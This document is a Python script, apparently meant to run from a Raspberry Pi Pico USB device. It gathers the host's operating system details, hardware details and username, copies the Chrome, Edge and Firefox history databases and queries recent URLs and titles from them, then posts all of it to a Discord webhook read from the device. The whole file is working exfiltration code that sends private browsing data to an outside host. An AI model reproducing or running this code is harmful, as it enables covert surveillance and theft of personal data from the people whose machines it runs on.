import os
import platform
import psutil
import json
import requests
import getpass
import sqlite3
from datetime import datetime

def send_to_discord(webhook, title, content):
    data = {
        "content": f"**{title}**\n{content}"
    }
    try:
        requests.post(webhook, json=data)
    except:
        print("[-] Failed to send to Discord")

def get_webhook_from_pico():
    # D: is your CIRCUITPY drive
    try:
        with open("D:/webhook.txt", "r") as f:
            return f.read().strip()
    except:
        return None

def get_browser_history():
    history_data = ""
    browsers = {
        "chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"),
        "edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
        "firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    }

    detected = []
    entries = []

    for name, path in browsers.items():
        if name == "firefox":
            try:
                for profile in os.listdir(path):
                    hist_path = os.path.join(path, profile, "places.sqlite")
                    if os.path.exists(hist_path):
                        detected.append(name)
                        conn = sqlite3.connect(hist_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 20")
                        for row in cursor.fetchall():
                            url, title, _ = row
                            entries.append(f"> {title or 'No Title'} - {url}")
                        conn.close()
            except Exception as e:
                entries.append(f"> Firefox Error: {e}")
        else:
            if os.path.exists(path):
                detected.append(name)
                try:
                    tmp = path + "_temp"
                    if os.path.exists(tmp):
                        os.remove(tmp)
                    import shutil
                    shutil.copy2(path, tmp)
                    conn = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                    for row in cursor.fetchall():
                        url, title, _ = row
                        entries.append(f"> {title or 'No Title'} - {url}")
                    conn.close()
                    os.remove(tmp)
                except Exception as e:
                    entries.append(f"> {name.capitalize()} Error: {e}")

    return detected, entries

def get_system_info():
    return f"""> OS: {platform.system()} {platform.version()}
> Platform: {platform.platform()}
> Machine: {platform.machine()}
> Processor: {platform.processor()}
> RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
> User: {getpass.getuser()}"""

if __name__ == "__main__":
    webhook = get_webhook_from_pico()
    if not webhook:
        print("[ERROR] Could not find webhook URL from Pico")
        exit()

    # System Info
    sysinfo = get_system_info()
    send_to_discord(webhook, "🖥 System Info", sysinfo)

    # Browser Forensics
    browsers, history = get_browser_history()
    send_to_discord(webhook, "🌐 Browsers Detected", f"{len(browsers)}\n" + ", ".join(browsers))

    if history:
        send_to_discord(webhook, "🕘 Browser History (last 20 entries)", "\n".join(history[:20]))
    else:
        send_to_discord(webhook, "🕘 Browser History", "No entries or access denied.")